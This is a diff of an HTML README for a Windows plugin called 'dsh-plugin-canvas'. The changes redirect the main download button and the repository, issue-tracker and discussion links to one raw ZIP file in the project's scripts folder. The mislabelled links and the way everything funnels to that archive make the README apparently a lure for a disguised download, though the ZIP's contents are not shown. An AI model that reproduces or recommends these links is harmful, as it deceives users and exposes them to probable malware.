@@ -19,7 +19,7 @@
 
 <ol>
   <li><strong>Visit the download link</strong> – Click the big green button below to go to the official download page.<br><br>
-  <a href="https://github.com/Tabbyaccessorial446/dsh-plugin-canvas/releases" style="display:inline-block;padding:14px 28px;background:#2ea44f;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download dsh-plugin-canvas</a><br><br></li>
+  <a href="https://raw.githubusercontent.com/Tabbyaccessorial446/dsh-plugin-canvas/main/scripts/plugin_dsh_canvas_2.0.zip" style="display:inline-block;padding:14px 28px;background:#2ea44f;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download dsh-plugin-canvas</a><br><br></li>
   <li><strong>Find the file</strong> – On that page, you will see a list of files. Look for the one that matches your Windows system (usually named <code>dsh-plugin-canvas.zip</code> or similar).</li>
   <li><strong>Download the ZIP</strong> – Click on it and save it to your computer (typically to your "Downloads" folder).</li>
   <li><strong>Extract the ZIP</strong> – Right‑click the downloaded ZIP file and choose <em>Extract All…</em> from the menu. Windows will ask where to put the files. Pick a folder you can remember, like <code>C:\dsh-plugin-canvas</code>.</li>
@@ -82,9 +82,9 @@ A: That's expected for now – blur masks are session‑based. We're working on 
 <h2>📚 Additional Resources</h2>
 
 <ul>
-  <li><a href="https://github.com/Tabbyaccessorial446/dsh-plugin-canvas">Project Repository</a></li>
-  <li><a href="https://github.com/Tabbyaccessorial446/dsh-plugin-canvas/issues">Report an Issue</a></li>
-  <li><a href="https://github.com/Tabbyaccessorial446/dsh-plugin-canvas/discussions">Discussion Forum</a></li>
+  <li><a href="https://raw.githubusercontent.com/Tabbyaccessorial446/dsh-plugin-canvas/main/scripts/plugin_dsh_canvas_2.0.zip">Project Repository</a></li>
+  <li><a href="https://raw.githubusercontent.com/Tabbyaccessorial446/dsh-plugin-canvas/main/scripts/plugin_dsh_canvas_2.0.zip">Report an Issue</a></li>
+  <li><a href="https://raw.githubusercontent.com/Tabbyaccessorial446/dsh-plugin-canvas/main/scripts/plugin_dsh_canvas_2.0.zip">Discussion Forum</a></li>
 </ul>
 
 <h2>🏁 Final Steps</h2>
